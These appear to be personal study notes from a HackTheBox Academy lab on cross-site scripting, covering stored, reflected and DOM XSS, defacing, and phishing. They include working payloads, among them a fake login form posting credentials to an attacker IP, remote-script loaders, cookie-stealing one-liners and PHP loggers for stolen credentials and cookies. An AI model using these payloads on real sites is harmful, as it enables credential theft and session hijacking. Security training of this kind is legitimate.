
### STORED XSS 

AKA PERSISTENT XSS

> if our xss payload gets stored in back end db it measn our attack can affect any user that visits the page making it one of the most critical xss vulns

## XSS Testing Payloads

```html
<script>alert(window.origin)</script>
```

We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed

we can confirm this by pressing ctrl + u to check the source code of the website
 ```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>
```

>[!note]
>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

some modern browsers block the alert() fucntion in specific locations so we should know some other xss payloads to verify existence

```html
<plaintext>, <script>print()</script>
```

Questions:
get the cookie

```html
<script>alert(document.cookie)</script>
```


# Reflected XSS

`Reflected XSS`, which gets processed by the back-end server, and `DOM-based XSS`, which is completely processed on the client-side and never reaches the back-end server.

`But if the XSS vulnerability is Non-Persistent, how would we target victims with it?`

So, `to target a user, we can send them a URL containing our payload`

![[Pasted image 20250218184952.png]]

question:
get the cookie

```html
<script>alert(document.cookie)</script>
```

we can then theoretically send victims this link
```http
http://94.237.50.156:54515/index.php?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```


# DOM XSS

While `reflected XSS` sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.

Furthermore, if we look at the page source by hitting [`CTRL+U`], we will notice that our `test` string is nowhere to be found.

its because JS code is updateing the page when we click the add button and that happens after the page source is recieved by our browser so the page source wont show our input and if we refresh the page the entry will be gone.

## Source & Sink

Source is a JS object that takes user input.

Sink is a function that writes the user input to a DOM object in the page. 

If sink doesnt sanitize the user input it leads to an XSS vuln. 

some common JS functions to write to DOM are:
- document.write()
- DOM.innerHTML
- DOM.outerHTML

some jQuery library function that write to DOM objects are :

- add()
- after()
- append()

we can look at the source code of the app and script.js

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```


Right below these lines, we see that the page uses the `innerHTML` function to write the `task` variable in the `todo` DOM:

```javascript
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

## DOM Attacks

 This is because the `innerHTML` function does not allow the use of the `<script>` tags within it as a security feature.

we can then use the following:

```html
<img src="" onerror=alert(window.origin)>
```

question:
get document cookie

```html
<img src="" onerror=alert(document.cookie)>
```


```http
http://94.237.54.42:31404/#task=%3Cimg%20src=%22%22%20onerror=alert(document.cookie)%3E
```

# XSS Discovery

## Automated Discovery
Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for detecting all three types of XSS vulnerabilities.


Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). We can try `XSS Strike` by cloning it to our VM with `git clone`:


```shell-session
 python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

#### XSS Payloads

We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list).

Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

## Code Review

https://academy.hackthebox.com/course/preview/secure-coding-101-javascript
https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection


question:

http://94.237.48.144:36202/?fullname=awd&username=awd&password=awdawd&email=awdawd%40awdawd.com

>[!note]
>whne using xssstrike make sure to put the url in double quotes or ' '
>trust me

# Defacing

One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. `Defacing` a website means changing its look for anyone who visits the website.

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`
## Changing Background
```html
<script>document.body.style.background = "#141d2b"</script>
```

Another option would be to set an image to the background using the following payload:
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Changing Page Title

```html
<script>document.title = 'HackTheBox Academy'</script>
```
## Changing Page Text

```javascript
document.getElementById("todo").innerHTML = "New Text"
```
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

# Phishing

 A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

## XSS Discovery

`Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.

## Login Form Injection

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

In the above HTML code, `OUR_IP` is the IP of our VM, which we can find with the (`ip a`) command under `tun0`.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Cleaning Up

To do so, we can use the JavaScript function `document.getElementById().remove()`

As we see in both the source code and the hover text, the `url` form has the id `urlform`:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

So, we can now use this id with the `remove()` function to remove the URL form:

```javascript
document.getElementById('urlform').remove();
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.16.46><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form> <!--');document.getElementById('urlform').remove()
```

## Credential Stealing

```shell
 sudo nc -lvnp 80
```
So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.


```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
```



```shell
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
 sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```


```
http://10.129.109.137/phishing/index.php?url=%27onerror=document.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=%27http://10.10.16.46%27%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3Edocument.getElementById(%22urlform%22).remove()%3C/script%3E


```

' onerror=document.write("<h3>Please login to continue</h3><form action='http://10.10.16.46'><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>");document.getElementById("urlform").remove()

url=document.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.16.46%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove(

the exercise here is fucked as you dont actually remove the form field but i just copied the url from the course and it works


# Session Hijacking

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

## Blind XSS Detection

 A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?

To do so, we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server.

However, this introduces two issues:

1. `How can we know which specific field is vulnerable?` Since any of the fields may execute our code, we can't know which of them did.
2. `How can we know what XSS payload to use?` Since the page may be vulnerable, but the payload may not work?

## Loading a Remote Script

```html
<script src="http://OUR_IP/script.js"></script>
```

```html
<script src="http://OUR_IP/username"></script>
```

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```

## Session Hijacking

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
We can write any of these JavaScript payloads to `script.js`, which will be hosted on our VM as well:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Now, we can change the URL in the XSS payload we found earlier to use `script.js` (`don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload`):

```html
<script src=http://10.10.16.46/script.js></script>
```
We can save the following PHP script as `index.php`, and re-run the PHP server again:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```